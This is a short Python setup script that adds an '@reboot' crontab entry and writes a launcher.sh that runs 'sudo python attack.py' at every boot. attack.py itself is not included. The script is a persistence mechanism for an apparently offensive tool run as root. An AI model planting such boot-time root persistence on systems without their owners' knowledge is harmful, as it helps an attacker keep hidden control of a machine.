import os

Path = os.getcwd()
os.system("crontab -l > mycron")
CommandString = "echo \'@reboot sh " + Path + "/launcher.sh > " + Path + "/Logging/cronlog 2>&1  \' >> mycron" 
os.system(CommandString)
os.system("crontab mycron")
os.system("rm mycron")

CommandLauncher = "echo \'sudo python " + Path + "/attack.py\' > launcher.sh"
os.system(CommandLauncher)
